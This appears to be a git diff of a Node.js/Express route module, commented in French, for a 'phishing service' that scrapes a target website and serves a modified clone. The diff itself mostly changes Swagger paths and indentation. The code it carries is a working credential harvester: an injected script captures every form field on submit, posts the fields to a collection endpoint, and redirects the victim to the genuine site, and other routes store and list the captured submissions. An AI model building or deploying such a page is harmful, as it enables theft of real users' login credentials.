@@ -18,7 +18,7 @@ const getDomainName = (urlStr) => {
 };
 /**
  * @swagger
- * /:
+ * /features/phishing-service:
  *   get:
  *     summary: Scraper un site et générer un fichier HTML modifié
  *     tags: [Feature - Phishing service]
@@ -80,48 +80,48 @@ router.get('/', async (req, res) => {
 
         referenceContent = referenceContent.replace(/<script[^>]*>([\S\s]*?)<\/script>/g, '');
         const script = `
-            <script>
-                document.addEventListener("DOMContentLoaded", function () {
-                const checkForm = () => {
-                    const form = document.querySelector("form");
-            
-                    if (form) {
-                        form.addEventListener("submit", async function (event) {
-                            event.preventDefault();
-            
-                            const formData = new FormData(form);
-                            const data = {};
-                            data.site = "${siteUrl}";
-                            formData.forEach((value, key) => {
-                                data[key] = value;
-                            });
-            
-                            try {
-                                const response = await fetch("http://localhost:4000/features/phishing-service", {
-                                    method: "POST",
-                                    headers: {
-                                        "Content-Type": "application/json",
-                                        "Authorization": "${token}"
-                                    },
-                                    body: JSON.stringify(data)
+                <script>
+                    document.addEventListener("DOMContentLoaded", function () {
+                    const checkForm = () => {
+                        const form = document.querySelector("form");
+                
+                        if (form) {
+                            form.addEventListener("submit", async function (event) {
+                                event.preventDefault();
+                
+                                const formData = new FormData(form);
+                                const data = {};
+                                data.site = "${siteUrl}";
+                                formData.forEach((value, key) => {
+                                    data[key] = value;
                                 });
-            
-                                const result = await response.json();
-                                console.log("Données reçues :", result);
-                                window.location.href = "${siteUrl}";
-                            } catch (error) {
-                                console.error("Erreur :", error);
-                            }
-                        });
-                    } else {
-                        console.log("Formulaire non trouvé, réessayer dans 5 secondes...");
-                        setTimeout(checkForm, 5000);
-                    }
-                };
-                checkForm();
-            });
-            </script>
-        `;
+                
+                                try {
+                                    const response = await fetch("http://localhost:4000/features/phishing-service", {
+                                        method: "POST",
+                                        headers: {
+                                            "Content-Type": "application/json",
+                                            "Authorization": "${token}"
+                                        },
+                                        body: JSON.stringify(data)
+                                    });
+                
+                                    const result = await response.json();
+                                    console.log("Données reçues :", result);
+                                    window.location.href = "${siteUrl}";
+                                } catch (error) {
+                                    console.error("Erreur :", error);
+                                }
+                            });
+                        } else {
+                            console.log("Formulaire non trouvé, réessayer dans 5 secondes...");
+                            setTimeout(checkForm, 5000);
+                        }
+                    };
+                    checkForm();
+                });
+                </script>
+            `;
 
         referenceContent = referenceContent.replace(/<\/body>/, script + '</body>');
 
@@ -139,7 +139,7 @@ router.get('/', async (req, res) => {
 });
 /**
  * @swagger
- * /:
+ * /features/phishing-service:
  *   post:
  *     summary: Soumettre les données d'un formulaire
  *     tags: [Feature - Phishing service]
@@ -233,7 +233,7 @@ router.post('/', async (req, res) => {
 });
 /**
  * @swagger
- * /datas:
+ * /features/phishing-service/datas:
  *   get:
  *     summary: Récupérer toutes les soumissions de formulaires
  *     tags: [Feature - Phishing service]
